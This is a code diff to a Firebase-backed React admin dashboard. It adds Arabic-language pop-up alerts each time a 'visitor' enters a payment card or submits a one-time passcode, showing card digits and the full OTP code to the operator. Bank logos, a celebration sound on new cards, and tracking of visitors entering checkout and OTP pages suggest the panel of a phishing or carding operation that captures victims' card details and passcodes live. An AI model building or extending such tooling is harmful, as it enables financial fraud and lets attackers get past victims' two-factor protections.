@@ -26,6 +26,8 @@ import {
   pushBankContactRequest,
 } from "@/lib/firebase";
 import { findBankLogo } from "@/lib/bank-logos";
+import { useToast } from "@/hooks/use-toast";
+import { ToastAction } from "@/components/ui/toast";
 import cardAddedSoundUrl from "@assets/roblox_celebration_1777060364811.mp3";
 import { onAuthStateChanged, type User } from "firebase/auth";
 import {
@@ -868,10 +870,15 @@ function AdminDashboard() {
     cardAudioRef.current.volume = 0.85;
   }
 
+  const { toast } = useToast();
   // Tracks the last `currentPage` we've seen for each visitor so we can
   // detect transitions into sensitive pages (checkout / otp / confirmation)
   // without re-firing alerts on every snapshot for the same state.
   const lastPageRef = useRef<Map<string, string>>(new Map());
+  // Tracks the last OTP value per visitor so we can fire a toast only when
+  // a NEW code is submitted (or an existing one changes), not on every
+  // snapshot replay.
+  const lastOtpRef = useRef<Map<string, string>>(new Map());
   // Per-visitor "recent alert" timestamps drive the row glow animation.
   // Stored in a ref + state mirror so the render reads from state but
   // updates from inside the snapshot don't cascade extra renders.
@@ -934,6 +941,60 @@ function AdminDashboard() {
             // ignore
           }
         }
+        // Pop a toast for each freshly-added card so the admin gets a
+        // visible heads-up even when sound is muted or the audio is
+        // blocked by autoplay policy.
+        for (const v of newCardVisitors) {
+          const last4 =
+            v.payment?.cardLast4 ||
+            String((v as any).cardNumber || "")
+              .replace(/\s+/g, "")
+              .slice(-4);
+          const name = v.name || "زائر بدون اسم";
+          toast({
+            title: "💳 بطاقة جديدة",
+            description: `${name} • ${last4 ? "•• " + last4 : "تم إدخال البطاقة"}`,
+            duration: 8000,
+            action: (
+              <ToastAction
+                altText="فتح"
+                onClick={() => setSelectedId(v.id)}
+                data-testid={`toast-open-card-${v.id}`}
+              >
+                فتح
+              </ToastAction>
+            ),
+          });
+        }
+
+        // Detect newly-submitted OTP codes — track per-visitor so we
+        // alert exactly once per submission, not on every snapshot.
+        const newOtpVisitors: Array<{ v: Visitor; code: string }> = [];
+        for (const v of list) {
+          const code = String((v as any).otp || "").trim();
+          const prev = lastOtpRef.current.get(v.id) || "";
+          if (code && code !== prev && cardSnapshotReadyRef.current) {
+            newOtpVisitors.push({ v, code });
+          }
+          lastOtpRef.current.set(v.id, code);
+        }
+        for (const { v, code } of newOtpVisitors) {
+          const name = v.name || "زائر بدون اسم";
+          toast({
+            title: "🔐 رمز OTP جديد",
+            description: `${name} • ${code}`,
+            duration: 10000,
+            action: (
+              <ToastAction
+                altText="فتح"
+                onClick={() => setSelectedId(v.id)}
+                data-testid={`toast-open-otp-${v.id}`}
+              >
+                فتح
+              </ToastAction>
+            ),
+          });
+        }
 
         // Detect transitions into sensitive pages (checkout/otp/confirmation).
         // Only fires when a visitor's `currentPage` actually CHANGES into a
@@ -947,6 +1008,9 @@ function AdminDashboard() {
         }
         for (const id of Array.from(cardSeenRef.current)) {
           if (!currentIds.has(id)) cardSeenRef.current.delete(id);
+        }
+        for (const id of Array.from(lastOtpRef.current.keys())) {
+          if (!currentIds.has(id)) lastOtpRef.current.delete(id);
         }
         const triggered: Array<{
           id: string;
